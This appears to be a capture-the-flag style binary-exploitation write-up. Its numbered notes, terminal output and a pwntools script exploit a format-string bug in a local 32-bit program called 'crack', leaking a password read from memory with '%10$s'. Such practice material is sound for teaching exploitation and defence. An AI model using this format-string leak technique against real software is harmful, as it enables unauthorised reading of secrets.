"""
1. localhost@red:~/Desktop/binexp$ python -c "print 'AAAA' + '%x.'*20" 
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

2. pass the step 1 output as input to program and got this
Hello ,AAAAffffcdf8.63.0.f7ffda9c.3.f7fcf410.1.0.1.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825

3. direct param access with %10$x

4. reading password from address 0x804a048 , objdump gave it, as we know password's address is passed as 2nd arg in read()

5. read value from that address and pass it to program as password
"""



"""
localhost@red:~/Desktop/binexp$ ./crack 
What your name ? AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Hello ,AAAAffffcdf8.63.0.f7ffda9c.3.f7fcf410.1.0.1.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
Your password :123
Goodbyte

localhost@red:~/Desktop/binexp$ ./crack
What your name ? AAAA%10$x
Hello ,AAAA41414141
Your password :123
Goodbyte

localhost@red:~/Desktop/binexp$ objdump -d crack -M intel | grep read -B3
 8048672:	6a 04                	push   0x4
 8048674:	68 48 a0 04 08       	push   0x804a048
 8048679:	ff b5 7c ff ff ff    	push   DWORD PTR [ebp-0x84]
 804867f:	e8 cc fd ff ff       	call   8048450 <read@plt>

EXPLOIT
"""



from pwn import *

r = process("./crack")

pass_addr = 0x804a048
p = p32(pass_addr)
p += '%10$s'

r.recvuntil('? ')
r.sendline(p)

data = r.recvuntil(':')
password = u32(data.split('\n')[0][11:])

print password
r.sendline(str(password))
print r.recv()

r.close()
